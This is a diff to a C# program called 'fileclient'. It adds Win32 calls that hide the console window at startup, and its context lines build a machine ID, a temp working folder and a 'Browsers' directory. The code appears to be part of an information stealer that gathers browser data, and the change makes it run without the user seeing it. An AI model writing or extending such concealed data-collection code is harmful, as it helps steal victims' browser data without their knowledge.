@@ -17,9 +17,14 @@ namespace fileclient
     internal class Program
     {
 
-        
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-       
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        private const int SW_HIDE = 0;
+        private const int SW_SHOW = 5;
 
         const int MAX_FILE_SIZE = 10 * 1024 * 1024;
         static string temp = Path.GetTempPath();
@@ -33,7 +38,8 @@ namespace fileclient
         static string HWID = Environment.MachineName;
         static async Task Main(string[] args)
         {
-            
+            IntPtr handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
 
             Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
             string browsersDir = Path.Combine(workdir, "Browsers");
